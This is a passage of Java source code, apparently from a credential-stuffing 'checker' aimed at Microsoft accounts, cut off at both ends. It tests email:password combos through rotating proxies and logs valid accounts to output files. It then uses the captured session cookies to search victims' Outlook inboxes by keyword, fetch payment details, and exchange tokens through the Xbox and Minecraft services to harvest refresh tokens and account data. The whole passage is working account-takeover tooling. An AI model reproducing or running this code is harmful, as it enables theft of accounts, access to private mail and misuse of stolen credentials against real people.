                                + CUI.ANSI_YELLOW + " |N/A| |N/A| |" + proxy + "|");
                    } else if (!enableCheckMinecraft & Show2FA) {
                        System.out.println(CUI.ANSI_DARK_WHITE + "[2FA]" + CUI.ANSI_BRIGHT_CYAN + "[?]"
                                + CUI.ANSI_CYAN + " |" + Email + "|"
                                + CUI.ANSI_YELLOW + " |N/A| |N/A| |" + proxy + "|");
                    }
                    if (save2FAs){
                        save(combo,"2fa");
                    }
                    return "yes";
                }
                deleteProxy(proxy);
                String Cookies = response.cookies().toString().replace("{", "").replace("}", "").replace(",", ";");
                int retry = 0;
                String Payment = "N/A";
                while (retry < paymentsCheckerRetries){
                    StringBuilder Payments = getPayments(Cookies);
                    if (Payments != null && Payments.toString().equals("false")){
                        retry++;
                    }else if (Payments !=null){
                        Payment = Payments.toString();
                        break;
                    }
                }
                String hasOFCape = "N/A";
                String result = "N/A";
                String minecraftUsernameG = "N/A";
                String minecraftAccessTokenG = "N/A";
                String hypixelRank = "N/A";
                String hypixelLevel = "N/A";
                String arcadeCoins = "N/A";
                String uhcCoins = "N/A";
                String uhcKilleds = "N/A";
                retry = 0;
                while (enableInboxSearcher & retry < inboxSearcherRetries){
                    result = inboxSearcher(Cookies);
                    if (result.equals("false")){
                        retry++;
                        result = "N/A";
                    }else {
                        break;
                    }
                }
                String host = proxy.split(":")[0];
                String type = proxy.split(":")[2];
                if (enableCheckMinecraft) {
                    boolean hasMinecraft = false;
                    StringBuilder stringBuilder = haveMinecraft(Cookies);
                    if (stringBuilder != null) {
                        String[] combo2 = stringBuilder.toString().split("JKLASDJKLASD");
                        if (combo2[0].equals("True")) {
                            hasMinecraft = true;
                        }
                        if (combo2.length == 2) {
                            minecraftAccessTokenG = combo2[1];
                        } else if (combo2.length == 3) {
                            minecraftAccessTokenG = combo2[1];
                            minecraftUsernameG = combo2[2];
                        } else if (combo2.length == 4) {
                            minecraftAccessTokenG = combo2[1];
                            minecraftUsernameG = combo2[2];
                            hypixelLevel = combo2[3];
                        } else if (combo2.length == 9) {
                            minecraftAccessTokenG = combo2[1];
                            minecraftUsernameG = combo2[2];
                            hypixelRank = combo2[3];
                            hypixelLevel = combo2[4];
                            arcadeCoins = combo2[5];
                            uhcCoins = combo2[6];
                            uhcKilleds = combo2[7];
                            hasOFCape = combo2[8];
                        }
                    }
                    ++microsoftChecker_hits;
                    ++microsoftChecker_process;
                    if (hypixelLevel != null && !hypixelLevel.equals("N/A")) {
                        if (Double.parseDouble(hypixelLevel) > 21.00 || hypixelRank != null || hasOFCape.equals("true")) {
                            ++microsoftChecker_superHits;
                        }
                    } else {
                        if (hypixelRank != null || hasOFCape.equals("true")) {
                            ++microsoftChecker_superHits;
                        }
                    }

                    if (hasMinecraft) {
                        ++microsoftChecker_hasMC;
                        System.out.println(CUI.ANSI_PURPLE + "[Valid]" + CUI.ANSI_GREEN + "[*]" + CUI.ANSI_GREEN + " |TRUE|"
                                + CUI.ANSI_CYAN + " |" + Email + "| |" + minecraftUsernameG + "| |" + hypixelLevel + "| |" + hypixelRank + "| |" + arcadeCoins + "| |" + uhcCoins + "| |" + uhcKilleds + "| |" + hasOFCape + "|"
                                + CUI.ANSI_YELLOW + " |" + Payment + "| |" + result
                                + "| |" +  host.split("\\.")[0] + ".*****:"+type  + "|");
                        writeToFile("./output/" + time + "/MicrosoftModule/" + "Hits_Minecraft.txt", Payment, minecraftUsernameG, combo, hypixelLevel, minecraftAccessTokenG, hypixelRank, result, arcadeCoins, uhcCoins, uhcKilleds, hasOFCape);
                    } else {
                        System.out.println(CUI.ANSI_PURPLE + "[Valid]" + CUI.ANSI_GREEN + "[*]" + CUI.ANSI_RED + " |FALSE|"
                                + CUI.ANSI_CYAN + " |" + Email + "| |" + minecraftUsernameG + "| |" + hypixelLevel + "| |" + hypixelRank + "| |" + arcadeCoins + "| |" + uhcCoins + "| |" + uhcKilleds + "| |" + hasOFCape + "|"
                                + CUI.ANSI_YELLOW + " |" + Payment + "| |" + result
                                + "| |" + host.split("\\.")[0] + ".*****:"+type + "|");
                        writeToFile("./output/" + time + "/MicrosoftModule/" + "Hits_NoMinecraft.txt", Payment, minecraftUsernameG, combo, hypixelLevel, minecraftAccessTokenG, hypixelRank, result, arcadeCoins, uhcCoins, uhcKilleds, hasOFCape);

                    }
                } else {
                    ++microsoftChecker_hits;
                    ++microsoftChecker_process;
                    System.out.println(CUI.ANSI_PURPLE + "[Valid]" + CUI.ANSI_GREEN + "[*]"
                            + CUI.ANSI_CYAN + " |" + Email + "|"
                            + CUI.ANSI_YELLOW + " |" + Payment + "| |" + result
                            + "| |" +  host.split("\\.")[0] + ".*****:"+type  + "|");
                    writeToFile("./output/" + time + "/MicrosoftModule/" + "Hits.txt", Payment, minecraftUsernameG, combo, hypixelLevel, minecraftAccessTokenG, hypixelRank, result, arcadeCoins, uhcCoins, uhcKilleds, hasOFCape);
                }
                return "yes";
            } else if (!response.body().contains("AR:{\"Username\":") & !response.body().contains("AQ:{\"Username\":") & !response.body().contains("AQ:{\"ErrorHR\":") & !response.body().contains("AR:{\"ErrorHR\":")) {

                if (!response.body().contains("<link rel=\"preconnect\" href=\"https://acctcdn.msauth.net\" crossorigin>")) {
                    ++microsoftChecker_tfa;
                    ++microsoftChecker_process;
                    if (enableCheckMinecraft & Show2FA) {
                        System.out.println(CUI.ANSI_DARK_WHITE + "[2FA]" + CUI.ANSI_BRIGHT_CYAN + "[?]" + CUI.ANSI_RED + " |FALSE|"
                                + CUI.ANSI_CYAN + " |" + Email + "| |N/A| |N/A| |N/A| |N/A| |N/A| |N/A| |N/A|"
                                + CUI.ANSI_YELLOW + " |N/A| |N/A| |" + proxy + "|");
                    } else if (!enableCheckMinecraft & Show2FA) {
                        System.out.println(CUI.ANSI_DARK_WHITE + "[2FA]" + CUI.ANSI_BRIGHT_CYAN + "[?]"
                                + CUI.ANSI_CYAN + " |" + Email + "|"
                                + CUI.ANSI_YELLOW + " |N/A| |N/A| |" + proxy + "|");
                    }
                    if (save2FAs){
                        save(combo,"2fa");
                    }
                }else if (response.body().contains("You\\'ve tried to sign in too many times with an incorrect account or password.")){
                    if (enableHighAccuracy){
                        if (response.body().contains("f:9")){
                            ++microsoftChecker_blocked;
                            ++microsoftChecker_process;
                            if (enableCheckMinecraft & ShowBad) {
                                System.out.println(CUI.ANSI_PURPLE + "[Blocked]" + CUI.ANSI_RED + "[-]" + CUI.ANSI_RED + " |FALSE|"
                                        + CUI.ANSI_CYAN + " |" + Email + "| |N/A| |N/A| |N/A| |N/A| |N/A| |N/A| |N/A|"
                                        + CUI.ANSI_YELLOW + " |N/A| |N/A| |" + proxy + "|");
                            } else if (!enableCheckMinecraft & ShowBad) {
                                System.out.println(CUI.ANSI_PURPLE + "[Blocked]" + CUI.ANSI_RED + "[-]"
                                        + CUI.ANSI_CYAN + " |" + Email + "|"
                                        + CUI.ANSI_YELLOW + " |N/A| |N/A| |" + proxy + "|");
                            }
                            if (saveBlockedCombos){
                                save(combo,"blocked");
                            }
                        }else if (response.body().contains("f:8")){
                            ++microsoftChecker_ProxiesErrors;
                            deleteProxy(proxy);
                            return "no";
                        }else {
                            ++microsoftUnknown;
                            save(combo,"unknown");
                        }
                    }else {
                        ++microsoftUnknown;
                        if (enableCheckMinecraft & ShowBad) {
                            System.out.println(CUI.ANSI_BRIGHT_CYAN + "[Unknown]" + CUI.ANSI_RED + "[^]" + CUI.ANSI_RED + " |FALSE|"
                                    + CUI.ANSI_CYAN + " |" + Email + "| |N/A| |N/A| |N/A| |N/A| |N/A| |N/A| |N/A|"
                                    + CUI.ANSI_YELLOW + " |N/A| |N/A| |" + proxy + "|");
                        } else if (!enableCheckMinecraft & ShowBad) {
                            System.out.println(CUI.ANSI_BRIGHT_CYAN+ "[Unknown]" + CUI.ANSI_RED + "[^]"
                                    + CUI.ANSI_CYAN + " |" + Email + "|"
                                    + CUI.ANSI_YELLOW + " |N/A| |N/A| |" + proxy + "|");
                        }
                        if (saveLowAccuracyUnknown){
                            save(combo,"unknown");
                        }

                    }
                }
                return "yes";
            } else if (response.cookies().size() >= 2 & response.body().contains("AQ:{\"Username\":") | response.body().contains("AQ:{\"ErrorHR\":") | response.body().contains("AR:{\"Username\":") |response.body().contains("AR:{\"ErrorHR\":")) {
                ++microsoftChecker_bad;
                ++microsoftChecker_process;
                if (enableCheckMinecraft & ShowBad) {
                    System.out.println(CUI.ANSI_RESET + "[Invalid]" + CUI.ANSI_RED + "[!]" + CUI.ANSI_RED + " |FALSE|"
                            + CUI.ANSI_CYAN + " |" + Email + "| |N/A| |N/A| |N/A| |N/A| |N/A| |N/A| |N/A|"
                            + CUI.ANSI_YELLOW + " |N/A| |N/A| |" + proxy + "|");
                } else if (!enableCheckMinecraft & ShowBad) {
                    System.out.println(CUI.ANSI_RESET + "[Invalid]" + CUI.ANSI_RED + "[!]"
                            + CUI.ANSI_CYAN + " |" + Email + "|"
                            + CUI.ANSI_YELLOW + " |N/A| |N/A| |" + proxy + "|");
                }
                return "yes";
            } else {
                System.out.println(Email + ":" + Password);
                ++microsoftChecker_process;
                deleteProxy(proxy);
                return "yes";
            }

        } catch (HttpStatusException e) {
            if (e.getStatusCode() != 500 & e.getStatusCode() != 404) {
                ++microsoftChecker_ProxiesErrors;
                deleteProxy(proxy);
                return "no";
            }
        } catch (IOException | UncheckedIOException e) {
            if (e instanceof SocketTimeoutException) {
                ++microsoftChecker_ProxiesErrors;
                deleteProxy(proxy);
                return "no";
            } else if (e instanceof java.net.SocketException) {
                ++microsoftChecker_ProxiesErrors;
                deleteProxy(proxy);
                return "no";
            } else {
                ++microsoftChecker_ProxiesErrors;
                deleteProxy(proxy);
                return "no";
            }
        } catch (NoSuchElementException | org.jsoup.UncheckedIOException e) {
            return "no";
        }
        return "no";
    }
    private static void deleteProxy(String proxy){
        if (enableProxiesChecker){
            try {
                if (!ProxyTester.proxies.isEmpty()) {
                    ProxyTester.proxies.remove(proxy);
                }
                if (!microsoftChecker_GoodProxies.isEmpty()) {
                    microsoftChecker_GoodProxies.remove(proxy);
                }
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        }
    }

    private static String inboxSearcher(String cookies) {
        String proxy1;
        if (enableProxiesChecker) {
            if (!microsoftChecker_GoodProxies.isEmpty()) {
                proxy1 = ProxyTester.MicrosoftModule_GetGoodProxy(microsoftChecker_GoodProxies);
            } else {
                proxy1 = ProxyTester.microsoftCheckerGetProxyAndCheckProxy(ProxyTester.proxies);
            }
        } else {
            proxy1 = ProxyTester.MicrosoftModule_GetRandomProxy(proxies1);
        }

        String[] proxy2;
        if (proxy1 != null) {
            proxy2 = proxy1.trim().split(":");
        } else {
            if (enableProxiesChecker) {
                ProxyTester.proxies.remove(null);
            } else {
                proxies1.remove(null);
            }

            return inboxSearcher(cookies);
        }
        ProxyTester.updatedProxies = true;
        Proxy proxy;
        if (proxy2.length == 3) {
            proxy = new Proxy(Proxy.Type.valueOf(proxy2[2]), new InetSocketAddress(proxy2[0], Integer.parseInt(proxy2[1])));
        } else {
            if (enableProxiesChecker) {
                ProxyTester.proxies.remove(proxy1);
            } else {
                proxies1.remove(proxy1);
            }

            return inboxSearcher(cookies);
        }
        try {
            Connection connection = Jsoup.connect("https://outlook.live.com/owa/?nlp=1&login=1")
                    .header("Cookie", cookies)
                    .proxy(proxy);
            Connection.Response response = connection.execute();
            String cookies1 = response.cookies().toString().replace("{", "").replace("}", "").replace(",", ";");
            String recourse = response.body();
            String url = ProxyTester.extractStringBetween(recourse, "\"fmHF\" action=\"", "\"");
            String pprid = ProxyTester.extractStringBetween(recourse, "\"pprid\" value=\"", "\"");
            String NAP = ProxyTester.extractStringBetween(recourse, "\"NAP\" value=\"", "\"");
            String ANON = ProxyTester.extractStringBetween(recourse, "ANON\" value=\"", "\"");
            String t = ProxyTester.extractStringBetween(recourse, "t\" value=\"", "\"");
            try {
                Connection connection1 = null;
                if (url != null) {
                    connection1 = Jsoup.connect(url)
                            .header("Cookies", cookies1)
                            .proxy(proxy)
                            .method(Connection.Method.POST)
                            .requestBody("wbids=0&pprid=" + pprid + "&wbid=MSFT&NAP=" + NAP + "&ANON=" + ANON + "&t=" + t);
                }
                Connection.Response response1 = null;
                if (connection1 != null) {
                    response1 = connection1.execute();
                }
                String cookies2 = null;
                if (response1 != null) {
                    cookies2 = response1.cookies().toString().replace("{", "").replace("}", "").replace(",", ";");
                }
                try {
                    Connection connection2 = null;
                    if (cookies2 != null) {
                        connection2 = Jsoup.connect("https://outlook.live.com/owa/0/service.svc?action=GetAccessTokenforResource&UA=0&app=Mail&n=10")
                                .ignoreContentType(true)
                                .header("Cookie", cookies2)
                                .proxy(proxy)
                                .header("action", "GetAccessTokenforResource")
                                .header("x-owa-urlpostdata", "%7B%22__type%22%3A%22TokenRequest%3A%23Exchange%22%2C%22Resource%22%3A%22https%3A%2F%2Foutlook.live.com%22%7D");
                    }
                    Connection.Response response2 = null;
                    if (connection2 != null) {
                        response2 = connection2.execute();
                    }
                    String AccessToken = null;
                    if (response2 != null) {
                        AccessToken = ProxyTester.extractStringBetween(response2.body(), "\"AccessToken\":\"", "\"");
                    }
                    try {
                        StringBuilder result = new StringBuilder();
                        String[] searchKeywords = searchKeyword.split(",");
                        for (String keyword : searchKeywords) {
                            Connection connection3 = Jsoup.connect("https://outlook.live.com/search/api/v2/query?n=117&cv=vNF1BrZTbJo9BEN/zBPIN0.126")
                                    .method(Connection.Method.POST)
                                    .ignoreContentType(true)
                                    .header("Content-Type", "application/json")
                                    .header("authorization", "Bearer " + AccessToken)
                                    .requestBody("{\"Cvid\":\"b5830af7-bb68-4e04-5875-8903167de422\",\"Scenario\":{\"Name\":\"owa.react\"},\"TimeZone\":\"Arab Standard Time\",\"TextDecorations\":\"Off\",\"EntityRequests\":[{\"EntityType\":\"Conversation\",\"ContentSources\":[\"Exchange\"],\"Filter\":{\"Or\":[{\"Term\":{\"DistinguishedFolderName\":\"msgfolderroot\"}},{\"Term\":{\"DistinguishedFolderName\":\"DeletedItems\"}}]},\"From\":0,\"Query\":{\"QueryString\":\"" + keyword + "\"},\"RefiningQueries\":null,\"Size\":25,\"Sort\":[{\"Field\":\"Score\",\"SortDirection\":\"Desc\",\"Count\":3},{\"Field\":\"Time\",\"SortDirection\":\"Desc\"}],\"EnableTopResults\":true,\"TopResultsCount\":3}],\"AnswerEntityRequests\":[{\"Query\":{\"QueryString\":\"" + keyword + "\"},\"EntityTypes\":[\"Event\",\"File\"],\"From\":0,\"Size\":10,\"EnableAsyncResolution\":true}],\"QueryAlterationOptions\":{\"EnableSuggestion\":true,\"EnableAlteration\":true,\"SupportedRecourseDisplayTypes\":[\"Suggestion\",\"NoResultModification\",\"NoResultFolderRefinerModification\",\"NoRequeryModification\",\"Modification\"]},\"LogicalId\":\"dda3fdd5-b20b-c34d-36ca-9d50aac4fbcf\"}");
                            Connection.Response response3 = connection3.execute();
                            String number1 = ProxyTester.extractStringBetween(response3.body(), "\"TotalWithoutCollapsing\":", ",");
                            result.append(keyword).append(" x ").append(number1).append("-");
                        }
                        return result.deleteCharAt(result.length() - 1).toString();
                    } catch (Exception e) {
                        return "false";
                    }
                } catch (IOException | RuntimeException e) {
                    return "false";
                }
            } catch (RuntimeException e) {
                return "false";
            }
        } catch (IOException e) {
            return "false";
        }
    }

    public static String checkHasOptifineCape(String name) {
        try {
            Connection connection = Jsoup.connect("http://s.optifine.net/capes/" + name + ".png")
                    .ignoreContentType(true)
                    .timeout(20000);
            connection.execute();
            return "true";
        } catch (HttpStatusException e) {
            if (e.getStatusCode() == 404) {
                return "false";
            }
            return checkHasOptifineCape(name);
        } catch (IOException e) {
            return checkHasOptifineCape(name);

        }
    }

    private static StringBuilder haveMinecraft(String cookies) {
        String proxy1;
        if (enableProxiesChecker) {
            if (!microsoftChecker_GoodProxies.isEmpty()) {
                proxy1 = ProxyTester.MicrosoftModule_GetGoodProxy(microsoftChecker_GoodProxies);
            } else {
                proxy1 = ProxyTester.microsoftCheckerGetProxyAndCheckProxy(ProxyTester.proxies);
            }
        } else {
            proxy1 = ProxyTester.MicrosoftModule_GetRandomProxy(proxies1);
        }

        String[] proxy2;
        if (proxy1 != null) {
            proxy2 = proxy1.trim().split(":");
        } else {
            if (enableProxiesChecker) {
                ProxyTester.proxies.remove(null);
            } else {
                proxies1.remove(null);
            }

            return haveMinecraft(cookies);
        }
        ProxyTester.updatedProxies = true;
        Proxy proxy;
        if (proxy2.length == 3) {
            proxy = new Proxy(Proxy.Type.valueOf(proxy2[2]), new InetSocketAddress(proxy2[0], Integer.parseInt(proxy2[1])));
        } else {
            if (enableProxiesChecker) {
                ProxyTester.proxies.remove(proxy1);
            } else {
                proxies1.remove(proxy1);
            }

            return haveMinecraft(cookies);
        }
        StringBuilder stringBuilderG = new StringBuilder();
        try {
            String location;
            String Code;
            String url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402b5328&response_type=code&scope=service%3A%3Auser.auth.xboxlive.com%3A%3AMBI_SSL &redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"; // Ҫ����URL
            Connection connection = Jsoup.connect(url)
                    .proxy(proxy)
                    .userAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0")
                    .header("Pragma", "no-cache")
                    .header("Cookie", cookies)
                    .header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
                    .followRedirects(false);
            Connection.Response response = connection.execute();
            location = response.header("Location");
            if (location != null) {
                Code = extractStringBetween(location, "code=", "&lc");
            } else {
                return null;
            }
            if (Code != null) {
                String access_token;
                String refresh_token;
                String MicrosoftOAuthDesktopUrl = "https://login.live.com/oauth20_token.srf";
                Connection connection1 = Jsoup.connect(MicrosoftOAuthDesktopUrl)
                        .proxy(proxy)
                        .header("Content-Type", "application/x-www-form-urlencoded")
                        .ignoreContentType(true)
                        .method(Connection.Method.POST)
                        .requestBody("client_id=00000000402b5328&code=" + Code + "&grant_type=authorization_code&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL");
                Connection.Response response1 = connection1.execute();
                access_token = extractStringBetween(response1.body(), "\"access_token\":\"", "\",");
                refresh_token = extractStringBetween(response1.body(), "\"refresh_token\":\"", "\",");
                if (access_token != null | refresh_token != null) {
                    String stringBuilder = getXSTSTokenAndUHS(getXboxToken(access_token));
                    if (stringBuilder != null) {
                        String[] strings = stringBuilder.split(";");
                        String XSTSToken = strings[0];
                        String uhs = strings[1];
                        String minecraftAccessToken = getMinecraftAccessToken(XSTSToken, uhs);
                        if (minecraftAccessToken != null) {
                            if (haveMCItem(minecraftAccessToken)){
                                String stringBuilder1 = getUsernameAndUUID(minecraftAccessToken);
                                String[] strings1;
                                if (stringBuilder1 != null) {
                                    strings1 = stringBuilder1.split(";");
                                } else {
                                    return stringBuilderG.append("True").append("JKLASDJKLASD").append(refresh_token);
                                }
                                if (strings1.length == 2) {
                                    System.out.println(strings1[1]);
                                    String stringBuilder2 = getHypixelInfo(strings1[1]);
                                    String[] strings2 = new String[0];
                                    if (stringBuilder2 != null) {
                                        strings2 = stringBuilder2.split(";");
                                    }
                                    String hasOFCape = checkHasOptifineCape(strings1[1]);
                                    if (strings2.length == 5) {
                                        return stringBuilderG.append("True").append("JKLASDJKLASD").append(refresh_token).append("JKLASDJKLASD").append(strings1[1]).append("JKLASDJKLASD").append(strings2[0]).append("JKLASDJKLASD").append(strings2[1]).append("JKLASDJKLASD").append(strings2[2]).append("JKLASDJKLASD").append(strings2[3]).append("JKLASDJKLASD").append(strings2[4]).append("JKLASDJKLASD").append(hasOFCape);
                                    }
                                    return stringBuilderG.append("True").append("JKLASDJKLASD").append(refresh_token).append("JKLASDJKLASD").append(strings1[1]);

                                }
                            }
                            return stringBuilderG.append("False").append("JKLASDJKLASD").append(refresh_token);
                        }
                        return null;
                    }
                    return null;
                }
                return null;
            }
            return null;
        } catch (IOException | InterruptedException e) {
            deleteProxy(proxy1);
            return haveMinecraft(cookies);
        }
    }

    private static String getXboxToken(String access_token) throws IOException, InterruptedException {
        try {
            Connection connection = Jsoup.connect("https://user.auth.xboxlive.com/user/authenticate")
                    .header("Accept", "application/json")
                    .header("Content-Type", "application/json")
                    .method(Connection.Method.POST)
                    .ignoreContentType(true)
                    .requestBody("{\"Properties\": {\"AuthMethod\": \"RPS\",\"SiteName\": \"user.auth.xboxlive.com\",\"RpsTicket\": \"" + access_token + "\"},\"RelyingParty\": \"http://auth.xboxlive.com\",\"TokenType\": \"JWT\"}");
            Connection.Response response = connection.execute();
            return ProxyTester.extractStringBetween(response.body(), "\"Token\":\"", "\",");
        } catch (HttpStatusException e) {

            if (e.getStatusCode() != 500 & e.getStatusCode() != 404) {
                    System.out.println("1;;;" + e.getStatusCode());
                    return getXboxToken(access_token); // �ݹ���÷���
            }
        } catch (SocketTimeoutException e) {
                return getXboxToken(access_token); // �ݹ���÷���
        }
        return null;
    }

    private static String getXSTSTokenAndUHS(String xblToken) throws IOException {
        try {
            Connection connection = Jsoup.connect("https://xsts.auth.xboxlive.com/xsts/authorize")
                    .header("Accept", "application/json")
                    .header("Content-Type", "application/json")
                    .method(Connection.Method.POST)
                    .ignoreContentType(true)
                    .requestBody("{\"Properties\": {\"SandboxId\": \"RETAIL\",\"UserTokens\": [\"" + xblToken + "\"]},\"RelyingParty\": \"rp://api.minecraftservices.com/\",\"TokenType\": \"JWT\"}");
            Connection.Response response = connection.execute();
            String XSTSToken = ProxyTester.extractStringBetween(response.body(), "\"Token\":\"", "\",");
            String uhs = ProxyTester.extractStringBetween(response.body(), "\"uhs\":\"", "\"");
            return XSTSToken + ";" + uhs;
        } catch (HttpStatusException e) {
            if (e.getStatusCode() != 500 & e.getStatusCode() != 401 & e.getStatusCode() != 404) {
                    System.out.println("2;;;" + e.getStatusCode());
                    return getXSTSTokenAndUHS(xblToken); // �ݹ���÷���
            }
            return null;
        } catch (IOException e) {
            return getXSTSTokenAndUHS(xblToken); // �ݹ���÷���
        }
    }

    private static String getMinecraftAccessToken(String XSTSToken, String uhs) throws InterruptedException {
        String proxy1;
        if (enableProxiesChecker) {
            if (!microsoftChecker_GoodProxies.isEmpty()) {
                proxy1 = ProxyTester.MicrosoftModule_GetGoodProxy(microsoftChecker_GoodProxies);
            } else {
                proxy1 = ProxyTester.microsoftCheckerGetProxyAndCheckProxy(ProxyTester.proxies);
            }
        } else {
            proxy1 = ProxyTester.MicrosoftModule_GetRandomProxy(proxies1);
        }

        String[] proxy2;
        if (proxy1 != null) {
            proxy2 = proxy1.trim().split(":");
        } else {
            if (enableProxiesChecker) {
                ProxyTester.proxies.remove(null);
            } else {
                proxies1.remove(null);
            }

            return getMinecraftAccessToken(XSTSToken, uhs);
        }
        ProxyTester.updatedProxies = true;
        Proxy proxy;
        if (proxy2.length == 3) {
            proxy = new Proxy(Proxy.Type.valueOf(proxy2[2]), new InetSocketAddress(proxy2[0], Integer.parseInt(proxy2[1])));
        } else {
            if (enableProxiesChecker) {
                ProxyTester.proxies.remove(proxy1);
            } else {
                proxies1.remove(proxy1);
            }

            return getMinecraftAccessToken(XSTSToken, uhs);
        }
        try {
            Connection connection = Jsoup.connect("https://api.minecraftservices.com/authentication/login_with_xbox")
                    .proxy(proxy)
                    .header("Accept", "application/json")
                    .header("Content-Type", "application/json")
                    .method(Connection.Method.POST)
                    .ignoreContentType(true)
                    .requestBody("{\"identityToken\": \"XBL3.0 x=" + uhs + ";" + XSTSToken + "\"}");
            Connection.Response response = connection.execute();
            return ProxyTester.extractStringBetween
                    (response.body(), "\"access_token\" : \"", "\",");
        } catch (HttpStatusException e) {
            if (e.getStatusCode() != 500 & e.getStatusCode() != 404) {
                deleteProxy(proxy1);
                    return getMinecraftAccessToken(XSTSToken, uhs); // �ݹ���÷���
            }
            return null;
        } catch (IOException e) {
            deleteProxy(proxy1);
            return getMinecraftAccessToken(XSTSToken, uhs); // �ݹ���÷���
        }
    }
    private static boolean haveMCItem(String token){
        String proxy1;
        if (enableProxiesChecker) {
            if (!microsoftChecker_GoodProxies.isEmpty()) {
                proxy1 = ProxyTester.MicrosoftModule_GetGoodProxy(microsoftChecker_GoodProxies);
            } else {
                proxy1 = ProxyTester.microsoftCheckerGetProxyAndCheckProxy(ProxyTester.proxies);
            }
        } else {
            proxy1 = ProxyTester.MicrosoftModule_GetRandomProxy(proxies1);
        }

        String[] proxy2;
        if (proxy1 != null) {
            proxy2 = proxy1.trim().split(":");
        } else {
            if (enableProxiesChecker) {
                ProxyTester.proxies.remove(null);
            } else {
                proxies1.remove(null);
            }

            return haveMCItem(token);
        }
        ProxyTester.updatedProxies = true;
        Proxy proxy;
        if (proxy2.length == 3) {
            proxy = new Proxy(Proxy.Type.valueOf(proxy2[2]), new InetSocketAddress(proxy2[0], Integer.parseInt(proxy2[1])));
        } else {
            if (enableProxiesChecker) {
                ProxyTester.proxies.remove(proxy1);
            } else {
                proxies1.remove(proxy1);
            }

            return haveMCItem(token);
        }
        try {
            Connection connection = Jsoup.connect("https://api.minecraftservices.com/entitlements/mcstore")
                    .header("Authorization","Bearer "+token)
                    .ignoreContentType(true)
                    .proxy(proxy);
            Connection.Response response = connection.execute();
            return response.body().contains("\"product_minecraft\"");
        } catch (HttpStatusException e) {
            if (e.getStatusCode() != 500 & e.getStatusCode() != 404) {
                deleteProxy(proxy1);
                    return haveMCItem(token);
            }
        } catch (IOException e) {
            deleteProxy(proxy1);
            return haveMCItem(token);
        }
        return haveMCItem(token);
    }
    private static String getUsernameAndUUID(String minecraftAccessToken) throws InterruptedException {
        String proxy1;
        if (enableProxiesChecker) {
            if (!microsoftChecker_GoodProxies.isEmpty()) {
                proxy1 = ProxyTester.MicrosoftModule_GetGoodProxy(microsoftChecker_GoodProxies);
            } else {
                proxy1 = ProxyTester.microsoftCheckerGetProxyAndCheckProxy(ProxyTester.proxies);
            }
        } else {
            proxy1 = ProxyTester.MicrosoftModule_GetRandomProxy(proxies1);
        }

        String[] proxy2;
        if (proxy1 != null) {
            proxy2 = proxy1.trim().split(":");
        } else {
            if (enableProxiesChecker) {
                ProxyTester.proxies.remove(null);
            } else {
                proxies1.remove(null);
            }

            return getUsernameAndUUID(minecraftAccessToken);
        }
        ProxyTester.updatedProxies = true;
        Proxy proxy;
        if (proxy2.length == 3) {
            proxy = new Proxy(Proxy.Type.valueOf(proxy2[2]), new InetSocketAddress(proxy2[0], Integer.parseInt(proxy2[1])));
        } else {
            if (enableProxiesChecker) {
                ProxyTester.proxies.remove(proxy1);
            } else {
                proxies1.remove(proxy1);
            }

            return getUsernameAndUUID(minecraftAccessToken);
        }
        try {
            Connection connection = Jsoup.connect("https://api.minecraftservices.com/minecraft/profile")
                    .proxy(proxy)
                    .header("Authorization", "Bearer " + minecraftAccessToken)
                    .ignoreContentType(true)
                    .method(Connection.Method.GET);
            Connection.Response response = connection.execute();
            Document document = response.parse();
            String get = document.text();
            String UUID = ProxyTester.extractStringBetween
                    (get, "\"id\" : \"", "\",");
            String Username = ProxyTester.extractStringBetween
                    (get, "\"name\" : \"", "\",");
            return UUID + ";" + Username;
        } catch (HttpStatusException e) {

            if (e.getStatusCode() != 500 & e.getStatusCode() != 404) {
                deleteProxy(proxy1);
                    return getUsernameAndUUID(minecraftAccessToken); // �ݹ���÷���
            }
            return null;
        } catch (IOException e) {
            deleteProxy(proxy1);

                return getUsernameAndUUID(minecraftAccessToken); // �ݹ���÷���
        }

    }

    private static String getHypixelInfo(String name) throws InterruptedException {
        try {
            Connection connection = Jsoup.connect("https://plancke.io/hypixel/player/stats/" + name);
            Connection.Response response1 = connection.execute();
            String ranked = null;
            String nameInfo = ProxyTester.extractStringBetween(response1.body(), "<meta name=\"description\" content=\"", "\" />");

            if (nameInfo != null) {
                if (nameInfo.contains("Hypixel Network")) {
                    return getHypixelInfo(name);

                }
                if (nameInfo.contains("[")) {
                    ranked = ProxyTester.extractStringBetween(nameInfo, "[", "]");
                }
            }
            String level = ProxyTester.extractStringBetween(response1.body(), "Level:</b> ", "<br/><b>");
            String arcadeCoins = ProxyTester.extractStringBetween(response1.body(), """
                    Arcade </a>
                    </h4>
                    </div>
                    <div id="collapse-1-1" class="panel-collapse collapse" aria-expanded="false">
                    <div class="panel-body">
                    <ul class="list-unstyled"><li><b>Coins:</b>\s""", "</li><br/><li>");
            String uhcInfo = ProxyTester.extractStringBetween(response1.body(), """
                    UHC Champions </a>
                    </h4>
                    </div>
                    <div id="collapse-1-13" class="panel-collapse collapse" aria-expanded="false">
                    <div class="panel-body">
                    <ul class="list-unstyled">""", " </div>");
            String uhcCoins = ProxyTester.extractStringBetween(uhcInfo, "<li><b>Coins:</b> ", "</li><li>");
            String uhcKilleds = ProxyTester.extractStringBetween(uhcInfo, "<td>Total</td><td>", "</td><td>");
            return ranked + ";" + level + ";" + arcadeCoins + ";" + uhcCoins + ";" + uhcKilleds;
        } catch (HttpStatusException e) {

            if (e.getStatusCode() != 500 & e.getStatusCode() != 404) {
                // ���״̬��Ϊ429���ȴ�һ��ʱ����������з���
                try {
                    ++microsoftChecker_ProxiesErrors;
                    getHypixelInfo(name);
                } catch (InterruptedException ignored) {
                }
            }
        } catch (IOException e) {
            if (e instanceof SocketTimeoutException) {
                ++microsoftChecker_ProxiesErrors;
                getHypixelInfo(name);
            } else if (e instanceof java.net.SocketException) {
                ++microsoftChecker_ProxiesErrors;
                getHypixelInfo(name);
            } else {
                getHypixelInfo(name);
            }
        } catch (NoSuchElementException e) {
            ++microsoftChecker_ProxiesErrors;
            getHypixelInfo(name);
        }
        return null;
    }

    private static StringBuilder getPayments(String cookies) {

        String proxy1;
